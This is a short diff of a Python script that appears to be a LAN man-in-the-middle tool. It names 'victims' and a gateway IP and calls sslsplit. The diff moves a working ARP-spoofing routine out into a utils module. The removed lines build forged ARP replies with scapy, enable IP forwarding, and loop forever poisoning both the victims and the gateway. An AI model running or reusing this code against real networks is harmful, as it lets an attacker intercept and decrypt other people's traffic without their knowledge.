@@ -5,28 +5,9 @@ import time
 import os
 import shutil
 
-from utils import get_mac, get_victims
+from utils import get_victims, trick
 
-GATEWAY_IP = '10.6.0.254'
 LOG_DIR = 'log'
-IPS = list()
-lock = threading.Lock()
-
-
-def spoof(target_ip, spoof_ip):
-    packet = scapy.ARP(op=2, pdst=target_ip,
-                       hwdst=get_mac(target_ip),
-                       psrc=spoof_ip)
-    scapy.send(packet, verbose=False)
-
-
-def trick(victim_ips: str):
-    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
-    while True:
-        for victim_ip in victim_ips:
-            spoof(victim_ip, GATEWAY_IP)
-            spoof(GATEWAY_IP, victim_ip)
-        time.sleep(10)
 
 
 def sslsplit():
